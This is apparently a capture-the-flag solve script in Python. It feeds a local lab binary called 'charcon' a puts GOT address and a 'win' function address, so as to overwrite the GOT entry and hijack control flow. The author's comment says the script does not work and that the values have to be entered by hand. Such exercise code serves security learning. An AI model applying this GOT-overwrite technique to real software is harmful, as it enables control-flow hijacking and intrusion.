import subprocess
from typing import BinaryIO

# solve script no work, just run the program and put the first value as decimal and second value as hex!

puts_got_addr = 0x804b3c8
win_addr = 0x804920a

def read_until(stream: BinaryIO, stop: bytes) -> bytes:
    output = b""
    c = stream.read(1)
    while(c != stop):
        output += c
        c = stream.read(1)
    return output

process = subprocess.Popen(
        ['static/charcon'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

print(read_until(process.stdout, b':').decode())
process.stdin.write(b"d\n")
process.stdin.flush()

print(read_until(process.stdout, b':').decode())
process.stdin.write(f"{puts_got_addr}\n".encode())
process.stdin.flush()

print(read_until(process.stdout, b':').decode())
process.stdin.write(b"h\n")
process.stdin.flush()

print(read_until(process.stdout, b':').decode())
process.stdin.write(f"{win_addr:x}\n".encode())
process.stdin.flush()

print(read_until(process.stdout, b':').decode())
